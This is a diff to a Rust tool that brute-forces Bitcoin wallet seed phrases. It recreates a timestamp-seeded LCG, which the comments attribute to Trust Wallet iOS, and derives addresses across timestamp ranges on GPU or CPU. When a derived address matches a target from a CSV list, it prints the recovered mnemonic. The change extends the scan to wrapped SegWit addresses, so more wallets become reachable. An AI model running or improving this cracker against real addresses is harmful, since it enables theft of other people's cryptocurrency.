@@ -20,37 +20,34 @@ use crate::scans::gpu_solver::GpuSolver;
 /// ## Entropy strategies
 ///
 /// Both strategies call `next_u32()` **16 times** for 16 bytes of entropy.
-/// They differ only in how each 32-bit output is truncated to a byte:
 ///
 /// | Strategy | Extraction | Byte range | Python name |
 /// |---|---|---|---|
 /// | `BytePerCallAnd` | `val & 0xFF`  | \[0, 255\] | `variant_b` |
 /// | `BytePerCallMod` | `val % 0xFF`  | \[0, 254\] | `variant_a` |
 ///
-/// `BytePerCallMod` (`% 0xFF` = `% 255`) **never produces byte 0xFF**.
-/// Which variant Trust Wallet iOS actually used is unconfirmed; both are scanned.
-///
 /// ## Derivation paths
 ///
-/// - `m/84'/0'/0'/0/0` → P2WPKH (native SegWit, Trust Wallet default)
-/// - `m/44'/0'/0'/0/0` → P2PKH  (legacy)
+/// - `m/44'/0'/0'/0/0` → P2PKH         (legacy `1...`)
+/// - `m/84'/0'/0'/0/0` → P2WPKH        (native SegWit `bc1q...`)
+/// - `m/49'/0'/0'/0/0` → P2SH-P2WPKH  (wrapped SegWit `3...`)
 ///
 /// ## Combo index (GPU)
 ///
 /// | combo | Strategy | Path |
 /// |---|---|---|
-/// | 0 | BytePerCallAnd | m/44' (P2PKH)  |
-/// | 1 | BytePerCallMod | m/44' (P2PKH)  |
-/// | 2 | BytePerCallAnd | m/84' (P2WPKH) |
-/// | 3 | BytePerCallMod | m/84' (P2WPKH) |
+/// | 0 | BytePerCallAnd | m/44' (P2PKH)        |
+/// | 1 | BytePerCallMod | m/44' (P2PKH)        |
+/// | 2 | BytePerCallAnd | m/84' (P2WPKH)       |
+/// | 3 | BytePerCallMod | m/84' (P2WPKH)       |
+/// | 4 | BytePerCallAnd | m/49' (P2SH-P2WPKH)  |
+/// | 5 | BytePerCallMod | m/49' (P2SH-P2WPKH)  |
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum EntropyStrategy {
     /// 16 LCG calls, `val & 0xFF` — byte ∈ \[0, 255\].
-    /// Matches Python `trezor_random_buffer_variant_b`.
     BytePerCallAnd,
 
     /// 16 LCG calls, `val % 0xFF` (= `% 255`) — byte ∈ \[0, 254\], 0xFF never produced.
-    /// Matches Python `trezor_random_buffer_variant_a`.
     BytePerCallMod,
 }
 
@@ -78,28 +75,38 @@ impl EntropyStrategy {
     }
 }
 
-/// Decode a combo index (0–3) into `(strategy, derivation_path, is_segwit)`.
-fn decode_combo(combo: u32) -> (EntropyStrategy, &'static str, bool) {
+/// Address type produced by a derivation path.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum AddrType {
+    /// Legacy P2PKH (`1...`), m/44'
+    P2Pkh,
+    /// Native SegWit P2WPKH (`bc1q...`), m/84'
+    P2Wpkh,
+    /// Wrapped SegWit P2SH-P2WPKH (`3...`), m/49'
+    P2ShP2Wpkh,
+}
+
+/// Decode a combo index (0–5) into `(strategy, derivation_path, addr_type)`.
+fn decode_combo(combo: u32) -> (EntropyStrategy, &'static str, AddrType) {
     match combo {
-        0 => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", false),
-        1 => (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", false),
-        2 => (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", true),
-        3 => (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", true),
-        _ => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", false),
+        0 => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
+        1 => (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
+        2 => (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
+        3 => (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
+        4 => (EntropyStrategy::BytePerCallAnd, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
+        5 => (EntropyStrategy::BytePerCallMod, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
+        _ => (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
     }
 }
 
 // ─── Public API ───────────────────────────────────────────────────────────
 
 /// Scan a single target address.
-/// Delegates to [`run_multi`].
 pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
     run_multi(&[target.to_string()], start_ts, end_ts)
 }
 
 /// Load addresses from a CSV/text file and scan all of them.
-///
-/// See [`load_targets_from_csv`] for the supported file format.
 pub fn run_multi_file(
     path: &Path,
     start_ts: u32,
@@ -110,15 +117,6 @@ pub fn run_multi_file(
 }
 
 /// Scan multiple target addresses in a single pass.
-///
-/// ## GPU mode (feature = "gpu")
-/// One `compute_trust_wallet_lcg_crack` kernel is launched per target address.
-/// For small target counts (< ~50) this is near-optimal; for larger batches a
-/// future multi-target kernel would be more efficient.
-///
-/// ## CPU mode
-/// All derived addresses are looked up in a pre-built `HashMap` so the inner
-/// loop is O(1) regardless of target count.
 pub fn run_multi(
     targets: &[String],
     start_ts: u32,
@@ -135,9 +133,8 @@ pub fn run_multi(
     // ── GPU path ──────────────────────────────────────────────────────────────
     #[cfg(feature = "gpu")]
     {
-        // Resolve each address to a Hash160 (reject unsupported types up front).
         let mut hash160s: Vec<[u8; 20]> = Vec::with_capacity(targets.len());
-        let mut valid_targets: Vec<&str>  = Vec::with_capacity(targets.len());
+        let mut valid_targets: Vec<&str> = Vec::with_capacity(targets.len());
 
         for addr_str in targets {
             match address_to_hash160(addr_str) {
@@ -148,7 +145,7 @@ pub fn run_multi(
                 None => {
                     warn!(
                         "[GPU] Skipping {:?} — unsupported type \
-                         (only P2PKH 1... and P2WPKH bc1q... are supported)",
+                         (only P2PKH 1..., P2SH 3..., and P2WPKH bc1q... are supported)",
                         addr_str
                     );
                 }
@@ -160,7 +157,7 @@ pub fn run_multi(
         }
 
         info!(
-            "[GPU] {} valid target(s) × {} timestamps × 4 combos",
+            "[GPU] {} valid target(s) × {} timestamps × 6 combos",
             valid_targets.len(),
             end_ts.saturating_sub(start_ts) + 1
         );
@@ -172,7 +169,6 @@ pub fn run_multi(
         let secp    = Secp256k1::new();
         let network = Network::Bitcoin;
 
-        // TODO: replace with a single multi-target kernel call when N > ~50
         for (target_idx, (target_addr, target_h160)) in
             valid_targets.iter().zip(&hash160s).enumerate()
         {
@@ -187,7 +183,7 @@ pub fn run_multi(
                 solver.compute_trust_wallet_lcg_crack(start_ts, end_ts, target_h160)?;
 
             for (timestamp, combo) in &hits {
-                let (strategy, path_str, is_segwit) = decode_combo(*combo);
+                let (strategy, path_str, addr_type) = decode_combo(*combo);
 
                 let mut rng     = MinstdRand0::new(*timestamp);
                 let mut entropy = [0u8; 16];
@@ -208,14 +204,23 @@ pub fn run_multi(
                     Err(e) => { warn!("[GPU] derive ts={}: {}", timestamp, e); continue; }
                 };
 
-                let address_str = if is_segwit {
-                    match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
-                        Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
-                        Err(e)  => { warn!("[GPU] pubkey: {}", e); continue; }
+                let address_str = match addr_type {
+                    AddrType::P2Wpkh => {
+                        match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
+                            Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
+                            Err(e)  => { warn!("[GPU] pubkey p2wpkh: {}", e); continue; }
+                        }
                     }
-                } else {
-                    let pubkey = child.to_keypair(&secp).public_key();
-                    Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
+                    AddrType::P2ShP2Wpkh => {
+                        match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
+                            Ok(cpk) => Address::p2shwpkh(&cpk, network).to_string(),
+                            Err(e)  => { warn!("[GPU] pubkey p2shwpkh: {}", e); continue; }
+                        }
+                    }
+                    AddrType::P2Pkh => {
+                        let pubkey = child.to_keypair(&secp).public_key();
+                        Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
+                    }
                 };
 
                 if &address_str == target_addr {
@@ -224,6 +229,7 @@ pub fn run_multi(
                     warn!("  Timestamp : {}", timestamp);
                     warn!("  Strategy  : {}", strategy.name());
                     warn!("  Path      : {}", path_str);
+                    warn!("  AddrType  : {:?}", addr_type);
                     warn!("  Mnemonic  : {}", mnemonic);
                 } else {
                     warn!(
@@ -245,16 +251,16 @@ pub fn run_multi(
     // ── CPU fallback ──────────────────────────────────────────────────────────
     #[cfg(not(feature = "gpu"))]
     {
-        // Pre-build a HashMap for O(1) target lookup.
         let target_map: HashMap<&str, usize> =
             targets.iter().enumerate().map(|(i, s)| (s.as_str(), i)).collect();
 
         let secp    = Secp256k1::new();
         let network = Network::Bitcoin;
 
-        let paths: &[(&str, bool)] = &[
-            ("m/84'/0'/0'/0/0", true),
-            ("m/44'/0'/0'/0/0", false),
+        let paths: &[(&str, AddrType)] = &[
+            ("m/44'/0'/0'/0/0", AddrType::P2Pkh),
+            ("m/84'/0'/0'/0/0", AddrType::P2Wpkh),
+            ("m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
         ];
         let strategies = [
             EntropyStrategy::BytePerCallAnd,
@@ -266,7 +272,7 @@ pub fn run_multi(
         let t0            = std::time::Instant::now();
 
         info!(
-            "[CPU] Scanning {} timestamps × 2 strategies × 2 paths × {} target(s)...",
+            "[CPU] Scanning {} timestamps × 2 strategies × 3 paths × {} target(s)...",
             end_ts.saturating_sub(start_ts) + 1,
             targets.len()
         );
@@ -287,7 +293,7 @@ pub fn run_multi(
                     Err(_) => continue,
                 };
 
-                for &(path_str, is_segwit) in paths {
+                for &(path_str, addr_type) in paths {
                     let path  = match DerivationPath::from_str(path_str) {
                         Ok(p)  => p,
                         Err(_) => continue,
@@ -297,14 +303,23 @@ pub fn run_multi(
                         Err(_) => continue,
                     };
 
-                    let address_str = if is_segwit {
-                        match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
-                            Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
-                            Err(_)  => continue,
+                    let address_str = match addr_type {
+                        AddrType::P2Wpkh => {
+                            match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
+                                Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
+                                Err(_)  => continue,
+                            }
                         }
-                    } else {
-                        let pubkey = child.to_keypair(&secp).public_key();
-                        Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
+                        AddrType::P2ShP2Wpkh => {
+                            match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
+                                Ok(cpk) => Address::p2shwpkh(&cpk, network).to_string(),
+                                Err(_)  => continue,
+                            }
+                        }
+                        AddrType::P2Pkh => {
+                            let pubkey = child.to_keypair(&secp).public_key();
+                            Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
+                        }
                     };
 
                     if let Some(&_idx) = target_map.get(address_str.as_str()) {
@@ -313,10 +328,10 @@ pub fn run_multi(
                         warn!("  Timestamp : {}", t);
                         warn!("  Strategy  : {}", strategy.name());
                         warn!("  Path      : {}", path_str);
+                        warn!("  AddrType  : {:?}", addr_type);
                         warn!("  Mnemonic  : {}", mnemonic);
                         found_any = true;
 
-                        // If scanning for a single target we can stop early.
                         if targets.len() == 1 {
                             break 'outer;
                         }
@@ -351,17 +366,16 @@ pub fn run_multi(
 /// ```text
 /// # Comment lines are ignored
 /// 1BpEi6DfDAUFd153wiGrvkiKW1iHBa4Lnn
+/// 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy , label
 /// bc1qcygs9dl4pnw68x2lnde... , optional_label
 /// ```
 ///
 /// Rules:
-/// - Lines starting with `#` are treated as comments and skipped.
+/// - Lines starting with `#` are skipped.
 /// - Blank lines are skipped.
-/// - The **first whitespace/comma/tab-delimited token** on each line is taken
-///   as the address; any remaining columns (labels, amounts, …) are ignored.
-/// - Lines that cannot be parsed as a Bitcoin mainnet P2PKH or P2WPKH address
-///   are skipped with a `WARN` log entry.
-/// - Duplicate addresses are deduplicated (first occurrence wins).
+/// - First token (comma/tab/space delimited) is the address; extra columns ignored.
+/// - Accepts mainnet P2PKH (`1...`), P2SH (`3...`), and P2WPKH (`bc1q...`).
+/// - Duplicates are deduplicated (first occurrence wins).
 pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
     use std::fs::File;
     use std::io::{BufRead, BufReader};
@@ -371,9 +385,9 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
     let reader  = BufReader::new(file);
     let network = Network::Bitcoin;
 
-    let mut addresses: Vec<String>           = Vec::new();
+    let mut addresses: Vec<String>                       = Vec::new();
     let mut seen:      std::collections::HashSet<String> = std::collections::HashSet::new();
-    let mut line_no:   usize                 = 0;
+    let mut line_no:   usize                             = 0;
 
     for line in reader.lines() {
         line_no += 1;
@@ -384,7 +398,6 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
             continue;
         }
 
-        // First token (comma, tab, or space delimited) = address.
         let addr = trimmed
             .splitn(2, |c| c == ',' || c == '\t' || c == ' ')
             .next()
@@ -395,13 +408,13 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
             continue;
         }
 
-        // Validate: must be a mainnet P2PKH or P2WPKH address.
+        // Validate: mainnet P2PKH, P2SH, or P2WPKH
         let valid = Address::from_str(addr)
             .ok()
             .and_then(|a| a.require_network(network).ok())
             .map(|a| {
                 let s = a.script_pubkey();
-                s.is_p2pkh() || s.is_p2wpkh()
+                s.is_p2pkh() || s.is_p2sh() || s.is_p2wpkh()
             })
             .unwrap_or(false);
 
@@ -412,7 +425,7 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
             }
         } else {
             warn!(
-                "[CSV] Line {}: skipping {:?} — not a mainnet P2PKH/P2WPKH address",
+                "[CSV] Line {}: skipping {:?} — not a mainnet P2PKH/P2SH/P2WPKH address",
                 line_no, addr
             );
         }
@@ -420,7 +433,7 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
 
     if addresses.is_empty() {
         anyhow::bail!(
-            "No valid Bitcoin mainnet P2PKH/P2WPKH addresses found in {}",
+            "No valid Bitcoin mainnet P2PKH/P2SH/P2WPKH addresses found in {}",
             path.display()
         );
     }
@@ -435,8 +448,16 @@ pub fn load_targets_from_csv(path: &Path) -> Result<Vec<String>> {
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 
-/// Extract the 20-byte Hash160 from a P2PKH or P2WPKH address script.
+/// Extract the 20-byte Hash160 payload from a P2PKH, P2SH, or P2WPKH address.
 /// Returns `None` for unsupported script types.
+///
+/// Script layouts:
+///   P2PKH  (25 bytes): OP_DUP OP_HASH160 OP_DATA_20 <hash160> OP_EQUALVERIFY OP_CHECKSIG
+///                      bytes[3..23] = hash160
+///   P2SH   (23 bytes): OP_HASH160 OP_DATA_20 <hash160> OP_EQUAL
+///                      bytes[2..22] = hash160
+///   P2WPKH (22 bytes): OP_0 OP_DATA_20 <hash160>
+///                      bytes[2..22] = hash160
 #[cfg(feature = "gpu")]
 fn address_to_hash160(addr_str: &str) -> Option<[u8; 20]> {
     let address = Address::from_str(addr_str).ok()?.assume_checked();
@@ -444,6 +465,8 @@ fn address_to_hash160(addr_str: &str) -> Option<[u8; 20]> {
     let bytes   = script.as_bytes();
     if script.is_p2pkh() && bytes.len() == 25 {
         bytes[3..23].try_into().ok()
+    } else if script.is_p2sh() && bytes.len() == 23 {
+        bytes[2..22].try_into().ok()
     } else if script.is_p2wpkh() && bytes.len() == 22 {
         bytes[2..22].try_into().ok()
     } else {
@@ -453,13 +476,6 @@ fn address_to_hash160(addr_str: &str) -> Option<[u8; 20]> {
 
 // ─── MinstdRand0 ─────────────────────────────────────────────────────────────
 
-/// `std::minstd_rand0`: Park-Miller Lehmer LCG
-///   x_{n+1} = (16807 · x_n) mod (2^31 − 1)
-///
-/// ## Seed normalisation
-/// Matches Python reference + libstdc++ / libc++:
-/// `s = seed % M; if s == 0 { s = 1 }`
-/// Without the `% M` a seed equal to M would cause the LCG to deadlock at 0.
 struct MinstdRand0 {
     state: u32,
 }
@@ -541,17 +557,19 @@ mod tests {
 
     #[test]
     fn test_decode_combo_coverage() {
-        let expected: &[(EntropyStrategy, &str, bool)] = &[
-            (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", false),
-            (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", false),
-            (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", true),
-            (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", true),
+        let expected: &[(EntropyStrategy, &str, AddrType)] = &[
+            (EntropyStrategy::BytePerCallAnd, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
+            (EntropyStrategy::BytePerCallMod, "m/44'/0'/0'/0/0", AddrType::P2Pkh),
+            (EntropyStrategy::BytePerCallAnd, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
+            (EntropyStrategy::BytePerCallMod, "m/84'/0'/0'/0/0", AddrType::P2Wpkh),
+            (EntropyStrategy::BytePerCallAnd, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
+            (EntropyStrategy::BytePerCallMod, "m/49'/0'/0'/0/0", AddrType::P2ShP2Wpkh),
         ];
-        for (i, &(ref exp_s, exp_p, exp_sw)) in expected.iter().enumerate() {
-            let (s, p, sw) = decode_combo(i as u32);
+        for (i, &(ref exp_s, exp_p, exp_at)) in expected.iter().enumerate() {
+            let (s, p, at) = decode_combo(i as u32);
             assert_eq!(s,  *exp_s, "strategy @ combo {}", i);
             assert_eq!(p,  exp_p,  "path @ combo {}",     i);
-            assert_eq!(sw, exp_sw, "segwit @ combo {}",   i);
+            assert_eq!(at, exp_at, "addr_type @ combo {}", i);
         }
     }
 
@@ -563,7 +581,6 @@ mod tests {
         f
     }
 
-    /// Single clean address per line.
     #[test]
     fn test_csv_single_address_per_line() {
         let content = "# comment\n\
@@ -572,12 +589,10 @@ mod tests {
                        1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf NA\n";
         let f = write_temp_csv(content);
         let result = load_targets_from_csv(f.path()).unwrap();
-        // duplicate should be deduplicated
         assert_eq!(result.len(), 1);
         assert_eq!(result[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf");
     }
 
-    /// CSV with comma separator (address,label).
     #[test]
     fn test_csv_comma_separated() {
         let content = "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf,genesis_block\n";
@@ -586,15 +601,22 @@ mod tests {
         assert_eq!(result[0], "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf");
     }
 
-    /// All invalid lines should return an error.
+    /// P2SH address (3...) must be accepted.
+    #[test]
+    fn test_csv_p2sh_address_accepted() {
+        // 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy is a well-known mainnet P2SH address
+        let content = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy,label\n";
+        let f = write_temp_csv(content);
+        let result = load_targets_from_csv(f.path()).unwrap();
+        assert_eq!(result[0], "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy");
+    }
+
     #[test]
     fn test_csv_all_invalid_returns_error() {
         let content = "not_an_address\nETH_ADDRESS_0x1234\n";
         let f = write_temp_csv(content);
         assert!(load_targets_from_csv(f.path()).is_err());
     }
-
-    // ---- Known vector (placeholder) ----------------------------------------
 
     #[test]
     #[ignore = "No reference vector until original iOS binary is confirmed"]
